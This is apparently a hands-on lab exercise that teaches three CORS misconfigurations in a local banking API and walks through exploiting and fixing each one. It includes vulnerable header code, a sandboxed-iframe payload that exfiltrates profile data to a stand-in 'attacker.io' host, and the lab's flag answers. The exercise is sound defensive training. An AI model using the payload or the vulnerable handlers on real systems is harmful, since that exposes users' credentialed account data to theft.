# Exercise 01 — Core Misconfigurations
## The three bugs that appear in most production APIs

> **Difficulty:** ⭐⭐☆☆☆  
> **Flags:** 3  
> **Browser page:** `http://localhost:3002/01-origin-reflection.html` and `02-null-origin.html`  
> **File to edit:** `servers/victim-api/cors-config.js`

---

## Your Mission

The BankAPI has three classic CORS misconfigurations on its account endpoints.
Each one allows a cross-origin page to read credentialed responses it shouldn't.

You will:
1. Identify the broken header logic in `cors-config.js`
2. Confirm the bug fires in the browser
3. Fix the handler
4. Verify with the test suite

---

## Background: The Three Most Common CORS Bugs

These three bugs account for the overwhelming majority of CORS findings in
real-world bug bounty and pentest engagements (PortSwigger, HackerOne data).
Learn to spot them on sight.

---

## Bug #1 — Wildcard Origin

**File:** `cors-config.js` → `corsWildcard()`  
**Route:** `GET /api/public`

```javascript
// What's in the code:
res.setHeader('Access-Control-Allow-Origin', '*');
```

A wildcard `*` means any website anywhere can make a cross-origin request and
read the response. No origin check, no allowlist — everyone is trusted.

**What browsers do with `*` + credentials:**
The spec forbids `*` combined with `Access-Control-Allow-Credentials: true`.
Browsers reject that combination. But `*` without credentials still exposes
all response data to any origin — including anything "sensitive" that shouldn't
be public.

### Phase 1: Observe

```bash
curl -v http://localhost:3000/api/public \
  -H "Origin: http://totally-random.evil.xyz" 2>&1 | grep "Access-Control"
```

What do you see in the `Access-Control-Allow-Origin` header?

### Phase 2: Exploit (Browser)

Open `http://localhost:3002/01-origin-reflection.html` → click **"Exploit — fetch /api/public"**.

Watch the output panel. Note what the browser receives.

### Phase 3: Exploit (Test)

```bash
npm run test:01 -- --testNamePattern="Bug #1"
```

The 🔴 exploit test passes. Record the flag.

### Phase 4: Fix

In `cors-config.js` → `corsWildcard()`:
- Replace `*` with an explicit check against `ALLOWED_ORIGINS`
- Only set `Access-Control-Allow-Origin` if the incoming origin is in the list
- Add `Vary: Origin` so caches don't serve one origin's response to another

### Phase 5: Verify

```bash
npm run test:01 -- --testNamePattern="Bug #1"
```

🔴 exploit tests fail. 🟢 hardening tests pass.

---

## Bug #2 — Origin Reflection (your original snippet)

**File:** `cors-config.js` → `corsReflectOrigin()`  
**Route:** `GET /api/account`

```javascript
// What's in the code:
const origin = req.headers.origin;
res.setHeader('Access-Control-Allow-Origin', origin || '*');
res.setHeader('Access-Control-Allow-Credentials', 'true');
```

The server reads whatever `Origin` the browser sends and echoes it straight
back as `Access-Control-Allow-Origin`. Combined with `Allow-Credentials: true`,
this is equivalent to allowing every website to read your users' credentialed
account data.

**Why this is worse than `*`:**
`*` is at least forbidden with credentials — browsers reject that combination.
Reflecting the origin works with credentials because each reflected value is
a specific origin (not a wildcard), so browsers accept it.

### Attack flow

```
1. Victim visits attacker's page at http://localhost:3002
2. Attacker's JS runs:
     fetch('http://localhost:3000/api/account', { credentials: 'include' })
3. Browser sends:
     GET /api/account
     Origin: http://localhost:3002
     Cookie: session=BANK_SESSION_abc123xyz
4. Vulnerable server responds:
     Access-Control-Allow-Origin: http://localhost:3002  ← reflected!
     Access-Control-Allow-Credentials: true
5. Browser: "localhost:3002 is in the ACAO header — allow JS to read"
6. Attacker's JS reads account number, balance, private_token
```

### Phase 1: Observe

```bash
curl -v http://localhost:3000/api/account \
  -H "Origin: http://localhost:3002" \
  -H "Cookie: session=BANK_SESSION_abc123xyz" 2>&1 | grep "Access-Control"
```

Is your origin reflected back?

### Phase 2: Exploit (Browser)

Open `http://localhost:3002/01-origin-reflection.html` → click **"Exploit — fetch /api/account"**.

Watch the output. Does the balance and private_token appear?

### Phase 3: Fix

In `cors-config.js` → `corsReflectOrigin()`:

```javascript
// Instead of:
res.setHeader('Access-Control-Allow-Origin', origin || '*');

// Do this:
if (origin && ALLOWED_ORIGINS.includes(origin)) {
  res.setHeader('Access-Control-Allow-Origin', origin);
  res.setHeader('Access-Control-Allow-Credentials', 'true');
  res.setHeader('Vary', 'Origin');
}
// If not in allowlist: set nothing. Browser blocks the read.
```

---

## Bug #3 — Null Origin Trusted

**File:** `cors-config.js` → `corsNullOrigin()`  
**Route:** `GET /api/profile`

```javascript
// What's in the code:
if (origin === 'null' || !origin) {
  res.setHeader('Access-Control-Allow-Origin', 'null');
  res.setHeader('Access-Control-Allow-Credentials', 'true');
}
```

Some developers explicitly handle the `null` origin — perhaps to support
local file testing. But browsers send `Origin: null` from sandboxed iframes,
which an attacker can embed anywhere.

**The attack:**
```html
<!-- On any malicious webpage: -->
<iframe sandbox="allow-scripts" srcdoc="
  <script>
    fetch('http://localhost:3000/api/profile', { credentials: 'include' })
      .then(r => r.json())
      .then(data => {
        // send data to attacker's server
        fetch('https://attacker.io/collect', { method: 'POST', body: JSON.stringify(data) })
      })
  </script>
"></iframe>
```

The iframe is invisible. The victim sees nothing. Their profile data is exfiltrated.

### Phase 2: Exploit (Browser)

Open `http://localhost:3002/02-null-origin.html` → click **"Step 2 — Launch sandboxed iframe attack"**.

Watch the output panel. Does the iframe successfully post profile data back?

### Phase 3: Fix

In `cors-config.js` → `corsNullOrigin()`:
- Remove all handling of `origin === 'null'`
- Never trust the null origin
- Only allow explicitly listed origins from `ALLOWED_ORIGINS`

---

## Flags

| # | Flag | Route |
|---|---|---|
| 1 | `CORS{wildcard_any_origin_reads_this}` | `GET /api/public` |
| 2 | `CORS{origin_reflection_exploit}` | `GET /api/account` |
| 3 | `CORS{null_origin_trusted}` | `GET /api/profile` |

---

## Further Reading

- [PortSwigger: Exploiting CORS misconfigurations](https://portswigger.net/web-security/cors/exploiting)
- [OWASP: Testing for CORS](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/07-Testing_Cross_Origin_Resource_Sharing)
- [HackerOne: Top CORS reports](https://github.com/reddelexc/hackerone-reports/blob/master/tops_by_bug_type/TOPTOP_CORS.md)
